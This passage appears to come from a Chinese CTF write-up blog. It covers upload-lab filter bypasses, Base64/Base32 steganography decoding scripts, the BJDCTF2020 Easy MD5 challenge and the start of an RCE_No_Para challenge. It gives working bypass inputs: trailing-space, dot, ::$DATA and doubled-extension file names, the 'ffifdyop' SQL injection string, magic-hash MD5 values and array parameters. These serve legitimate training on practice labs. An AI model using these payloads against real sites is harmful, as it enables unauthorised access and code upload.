class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>源代码没有去掉空格，直接在文件名末尾加空格绕过黑名单<br>（Linux不可以，只有在windows下能成功）<br><img src="https://img-blog.csdnimg.cn/11e78f1621354aae8126dab8929c4c37.png" alt="在这里插入图片描述"></p>
<h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><p>和上一题类似，本题没有去掉文件名末尾的点，故抓包后文件末尾加点绕过</p>
<h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><p><img src="https://img-blog.csdnimg.cn/7125240acb9e4ffe8200ad3e4dea11ac.png" alt="在这里插入图片描述"><br>源代码中没有去掉::$DATA，抓包在文件末尾加上后可绕过检测，但解析时会忽略::$DATA<br><img src="https://img-blog.csdnimg.cn/8fdf41e0720f4f1fa8d460e21525dc5b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题源码中能过滤的都过滤了，但可以知道<code>deldot</code>只会删除末尾的一个点，<br>故可以构造文件后缀<code>php. .</code><br><img src="https://img-blog.csdnimg.cn/3da626d9a5b64d228c8ad1386b2c12d8.png" alt="在这里插入图片描述"></p>
<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题源代码中<code>str_ireplace</code>会将黑名单中的函数替换为空，故双写绕过<br><img src="https://img-blog.csdnimg.cn/984f3aa8ef3a42d2844b1c8a4f592f80.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Base编码方式以及隐写原理</title>
    <url>/2021/12/08/baseSteg/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>base编码是一种常见的编码方式，常见的有base64、base32、base16，最近在做题时碰到了一道base隐写的misc题目，于是上网学习了一下base的编码方式以及隐写原理</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">


<h1 id="base64编码方式"><a href="#base64编码方式" class="headerlink" title="base64编码方式"></a>base64编码方式</h1><p>Base64就是一种基于64个可打印字符来表示二进制数据的方法，具体的64个字符分别是A-Za-z0-9+&#x2F;以及占位符&#x3D;<br><img src="https://img-blog.csdnimg.cn/2d11a17ad3144a6ba6dd111accf43ce8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="&lt;font color=#999AAA &gt;示例：pandas 是基于NumPy 的一种工具，该工具是为了解决数据分析任务而创建的。"><br>base64编码首先将原字符串的每一个字符转换为8位的二进制ascii码，将所有的8位二进制数拼接后按照6个一组进行重组，再将每一组转换为10进制，去base64的索引表中寻找对应编码字符，以下图为例<br><img src="https://img-blog.csdnimg.cn/6aefefdd41b643b1b57012edb1b92d3f.png" alt="在这里插入图片描述"><br>原字符串为hel，将ascii码转化为二进制后一共3*8&#x3D;24位，再6个一组，故编码后为aGVs四位字符。<br>但在实际过程中，并不是所有的字符串转化后长度都是6的倍数，这时就需要用0来补充未满的位数，并使用&#x3D;来当作占位符，使最终的长度为8的倍数<br><img src="https://img-blog.csdnimg.cn/43c15c4a44a24f9a8a79bd70efc975a1.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/40a569dcf8a64a659e0daa7972bb0736.png" alt="在这里插入图片描述"></p>
<h1 id="base64解码方式"><a href="#base64解码方式" class="headerlink" title="base64解码方式"></a>base64解码方式</h1><p>在对base64进行解码时，会将需要解码的字符串每四个分为一组（在有占位符&#x3D;的情况下，待解码的内容长度总是4的倍数）<br>当末尾是<code>=</code>时，则将等于号去掉，并将最后一个字符的后两位二进制数去掉，剩下的二进制数长度即为8的倍数，再进行解码<br>当末尾是<code>==</code>时，则将两个等于号去掉，并将最后一个字符的后四位二进制数去掉，剩下的二进制数长度即为8的倍数，再进行解码</p>
<h1 id="base64隐写原理"><a href="#base64隐写原理" class="headerlink" title="base64隐写原理"></a>base64隐写原理</h1><p>在存在占位符<code>=</code>的情况下，会将部分位的二进制数丢弃，而这些被丢弃的位中可以插入隐写的信息，即在那些用0补充的位上插入别的信息，同时又不影响base解码<br>可知base64编码中，末尾<code>=</code>的个数只可能是0个、1个、2个，而0个的时候无法隐写，故我们需要考虑末尾有1个或2个等号的情况</p>
<h1 id="base64隐写例题：-GXYCTF2019-SXMgdGhpcyBiYXNlPw-x3D-x3D"><a href="#base64隐写例题：-GXYCTF2019-SXMgdGhpcyBiYXNlPw-x3D-x3D" class="headerlink" title="base64隐写例题：[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;"></a>base64隐写例题：[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;</h1><p>buu上有题目，附件可自行下载，<br><img src="https://img-blog.csdnimg.cn/4d992119bc0a40d5a8ac846bdf007051.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>将附件中的base64编码正常解码后会得到一大堆英文语句，虽然有含义但是没有跟flag相关的信息，于是我们要考虑是否存在base64隐写，可用工具进行简单判断，把其中一句用base64解码后再编码</p>
<p><img src="https://img-blog.csdnimg.cn/a257f8c8cca84e258dfd60920c981ef8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到，解码后再编码的结果和原先不一样，则本题存在base64隐写，原本的00填充位一定隐藏了别的信息，我们可以取出所有隐写位的信息，全部拼接起来后8个一组计算10进制，再当作ascii码转化为字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">tmpbin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">    line=line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(line[-<span class="number">1</span>]==<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(line[-<span class="number">2</span>]==<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">            i=table.index(line[-<span class="number">3</span>])</span><br><span class="line">            b=<span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            b=b.zfill(<span class="number">6</span>)</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">            <span class="built_in">print</span>(b[-<span class="number">4</span>:]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            tmpbin+=b[-<span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i = table.index(line[-<span class="number">2</span>])</span><br><span class="line">            b = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            b = b.zfill(<span class="number">6</span>)</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">            <span class="built_in">print</span>(b[-<span class="number">2</span>:]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            tmpbin+=b[-<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">length= <span class="built_in">len</span>(tmpbin)/<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(length)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(tmpbin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>






<h1 id="base32隐写"><a href="#base32隐写" class="headerlink" title="base32隐写"></a>base32隐写</h1><p>与base64隐写原理相同，通过改变填充位的0来隐藏信息，以下为base32的编码表，由于只有32个字符，故base32在编码时为5位一组来编码，末尾的<code>=</code>个数有可能为0个、1个、3个、4个、6个，下面直接给出脚本<br><img src="https://img-blog.csdnimg.cn/0788695f57804e87b2c054cf6b49bfff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">table=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;xjj.txt&quot;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">tmpbin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">    line=line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(line[-<span class="number">1</span>]==<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(line[-<span class="number">3</span>]==<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span>(line[-<span class="number">4</span>]==<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> (line[-<span class="number">6</span>] == <span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">                    i=table.index(line[-<span class="number">7</span>])</span><br><span class="line">                    b = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                    b = b.zfill(<span class="number">5</span>)</span><br><span class="line">                    tmpbin+=b[-<span class="number">2</span>:]</span><br><span class="line">                    <span class="built_in">print</span>(line)</span><br><span class="line">                    <span class="built_in">print</span>(b)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = table.index(line[-<span class="number">5</span>])</span><br><span class="line">                    b = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                    b = b.zfill(<span class="number">5</span>)</span><br><span class="line">                    tmpbin += b[-<span class="number">4</span>:]</span><br><span class="line">                    <span class="built_in">print</span>(line)</span><br><span class="line">                    <span class="built_in">print</span>(b)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i = table.index(line[-<span class="number">4</span>])</span><br><span class="line">                b = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                b = b.zfill(<span class="number">5</span>)</span><br><span class="line">                tmpbin += b[-<span class="number">1</span>:]</span><br><span class="line">                <span class="built_in">print</span>(line)</span><br><span class="line">                <span class="built_in">print</span>(b)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i = table.index(line[-<span class="number">2</span>])</span><br><span class="line">            b = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            b = b.zfill(<span class="number">5</span>)</span><br><span class="line">            tmpbin += b[-<span class="number">3</span>:]</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">length= <span class="built_in">len</span>(tmpbin)/<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(length)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(tmpbin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tmpbin)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 Easy MD5</title>
    <url>/2021/11/17/bjd-ezmd5/</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/e58ca46bc4364e69aab4fb812932c180.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>题目环境进入后是一个输入框，随便传一个值，用burp抓包看看<br><img src="https://img-blog.csdnimg.cn/533819ff77e44c6ab54cc44bee7735a3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看请求包可知，输入的字符串会被当做password的值以get方式传递，<br>查看响应报文会发现提示，是一个sql语句，其中用到了<code>md5($pass,true)</code><br><img src="https://img-blog.csdnimg.cn/a9bd79e7bc844fec9b94f6a5efad5e2e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">第二个参数true会将md5值用原始的6字符输出，<br>在网上搜索后发现这个可以用<code>ffifdyop</code>绕过，绕过原理是：ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是’ or ‘6，而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’，等价于 <code>or 一个永真式</code>，因此相当于万能密码，可以绕过md5($pass,true)函数<br><img src="https://img-blog.csdnimg.cn/a40f6e1063c94f48b3c557a1f3ab3d64.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在下一个界面可以看到注释中有提示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>对于md5弱类型比较，可以直接传入两个字符串，使其md5后为0e+纯数字串</p>
<blockquote>
<p>QNKCDZO<br>0e830400451993494058024219903391<br>s878926199a<br>0e545993274517709034328855841020<br> s155964671a<br>0e342768416822451524974117254469<br> s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br> s1885207154a<br>0e509367213418206700842008763514</p>
</blockquote>
<p>构造如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=s878926199a&amp;b=s155964671a</span><br></pre></td></tr></table></figure>
<p>进入下一关看见如下代码<br><img src="https://img-blog.csdnimg.cn/e90dff865c2347d1b534eab53ab980ce.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这和上一关的绕过方法类似，不过此处为<code>===</code>是强比较，强比较一般有两种方法，一种是数组绕过，一种是直接强碰撞，我们这里选择数组绕过<br><code>param1[]=1&amp;param2[]=2</code></p>
<p><img src="https://img-blog.csdnimg.cn/5b3927d796e94a7983ef951bb3758f67.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到flag</p>
]]></content>
      <tags>
        <tag>BJDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>长安战疫cazy wp</title>
    <url>/2022/01/09/cazy/</url>
    <content><![CDATA[<h1 id="Web部分"><a href="#Web部分" class="headerlink" title="Web部分"></a>Web部分</h1><h2 id="0x01-RCE-No-Para"><a href="#0x01-RCE-No-Para" class="headerlink" title="0x01 RCE_No_Para"></a>0x01 RCE_No_Para</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>正则匹配</strong><br><code>/[^\W]+\((?R)?\)/</code><br><code>\W</code> 元字符用于查找非单词字符。<br>单词字符包括：a-z、A-Z、0-9，以及下划线。<br>故<code>[^\W]</code>可以匹配所有单词字符<br><code>+</code>表示可以匹配一个或多个<br><code>\(</code>和<code>\)</code>为左右括号<br><code>(?R)?</code>表示递归整个模式</p>
